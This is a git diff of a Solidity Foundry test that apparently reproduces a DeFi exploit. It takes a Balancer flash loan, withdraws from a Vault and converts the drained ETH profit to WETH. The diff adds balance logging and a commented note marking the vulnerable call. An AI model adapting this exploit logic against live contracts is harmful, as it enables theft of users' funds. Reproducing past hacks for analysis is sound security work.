@@ -38,9 +38,25 @@ contract ContractTest is DSTest{
         uint256 [] memory amounts = new uint256[](1);
         amounts[0] = 1_000 * 1e18;
         bytes memory userData = "0x2";
+
+        emit log_named_decimal_uint(
+            "[Start] Before flashloan, ETH balance",
+            address(Vault).balance,
+            18
+        );
         balancer.flashLoan(address(Vault), tokens, amounts, userData);
 
+        emit log_named_decimal_uint(
+            "[Start] After flashloan, ETH balance",
+            address(Vault).balance,
+            18
+        );
         Vault.withdraw(9e16);
+        /*
+      uint256 to_send = address(this).balance;  // vulnerable point, call flashloan first to make vault remain enough ETH.
+      (bool status, ) = msg.sender.call.value(to_send)("");  //done
+        */
+
         // ETH to WETH
         uint256 ETHProfit = address(this).balance - ETHBalanceBefore;
         address(WETH).call{value: ETHProfit}(abi.encodeWithSignature("deposit"));
